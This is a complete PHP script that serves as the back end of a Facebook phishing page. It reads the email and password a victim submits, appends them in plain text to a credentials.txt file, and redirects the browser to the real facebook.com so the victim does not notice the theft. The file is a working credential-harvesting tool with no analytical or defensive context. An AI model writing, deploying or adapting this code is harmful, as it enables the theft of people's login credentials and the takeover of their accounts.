<?php
    //Extract the credentials received
    $email = $_POST["email"];
    $password = $_POST["pass"];
    //Write the credentials to text file
    $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
    $txt = "USERNAME = $email , PASSWORD = $password\n";
    fwrite($myfile, "\n". $txt);
    fclose($myfile);
    //Redirect the browser to original login page
    header("Location: https://www.facebook.com/");
    exit();
?>
